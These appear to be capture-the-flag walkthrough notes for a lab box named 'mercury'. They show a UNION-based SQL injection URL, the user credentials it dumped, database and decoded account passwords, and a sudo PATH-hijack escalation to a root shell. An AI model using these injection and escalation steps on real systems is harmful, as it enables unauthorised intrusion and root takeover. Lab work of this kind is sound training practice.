```
http://192.168.56.108:8080/mercuryfacts/1%20union%20select%20username%20from%20users/
```

MySQL Injection using UNION after WHERE:

Users:
('john',), ('laura',), ('sam',), ('webmaster',)
Passwords:
('johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',)


```
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'mercury',
        'USER': 'dbmaster',
        'PASSWORD': '8cSQK0HMJtNxaJwsKwgDwo',
        'HOST': '127.0.0.1',
        'PORT': '3306',
    }
}
```

from notes.txt using `echo "encoded" | base64 -d >> decoded`:
linuxmaster:mercurymeandiameteris4880km

**Important:**

sudo -l displays `(root: root) SETENV: /usr/bin/check_logs.sh` which contains tail of a log.
I can change the environment variable of PATH, create a new "tail" executable in /tmp which will execute custom command (/bin/bash)

```
export PATH=/tmp:$PATH
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```